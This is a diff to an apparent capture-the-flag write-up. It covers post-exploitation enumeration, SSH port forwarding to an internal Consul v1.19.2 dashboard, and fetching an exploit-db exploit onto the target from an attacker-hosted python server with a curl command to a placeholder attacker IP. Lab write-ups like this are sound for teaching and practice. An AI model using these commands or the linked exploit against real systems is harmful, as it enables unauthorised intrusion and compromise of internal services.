@@ -202,11 +202,15 @@ Trying the password for the ron user, we can see that he reused the password for
 
 ![NON](file-20250515015234113.png)
 
-To get a more stable shell then `nc`, we established an `SSH`  connection.
+To get a more stable shell then `nc`, we established an `SSH`  connection. After that we listed the processes running on the machine 
+
+```bash
+ss -lntp
+```
 
 ![NON](file-20250515015341748.png)
 
-With a simple bash script, we can curl every internal service to see which ones are an `http(s)` server
+With a simple bash script, we can curl every internal service to see which ones are an `http(s)` server to see if there are any internal servers running.
 
 ```bash
 ss -lntp | awk '{print $4}' | while IFS= read host; do echo "curling host: $host"; curl -s "$host" |head -n1 ;done
@@ -214,8 +218,29 @@ ss -lntp | awk '{print $4}' | while IFS= read host; do echo "curling host: $host
 
 ![NON](file-20250515020026416.png)
 
-Accessing the forwarded port, we have now access to a `consul` dashboard
+We can see that the internal port `8500` is returning a valid `http` response. To access it through `ssh`, we can use the `-L` parameter to forward the port to our local machine with `-L <local_port>:<remote_host>:<remote_port>`, where `<local_port>` is the port we want to use on our local machine, `<remote_host>` is the host we want to connect to (in this case `localhost`) and `<remote_port>` is the port we want to connect to (in this case `8500`), resulting in the command `-L 8500:127.0.0.1:8500`.
+
+> We need to pass this parameter on a `ssh` command, or we coudl specify the option `-o EnableEscapeCommandLine=yes` to enable the escape command line, which allows us to use the `~C` command to open a ssh shell, where we could send this command to do the port forward
+{: .prompt-info}
+
+```bash
+ssh> -L 8500:127.0.0.1:8500
+Forwarding port.
+```
+
+Accessing the forwarded port, we can see that we have now access to a `consul v1.19.2` dashboard
 
 ![NON](file-20250515020149717.png)
 
+Looking up for exploits for this specifc version, I was able to find the following [exploit](https://www.exploit-db.com/exploits/51117). Sending it to the remote host with a `python http server` I was able to execute the exploit.
+
+```bash
+# Start the python http server on our machine
+python3 -m http.server 8000
+
+# Download the exploit on our remote host
+curl http://<YOUR_IP>:8000/51117.py -o exploit.py
+```
+
 ![NON](file-20250515023935052.png)
+
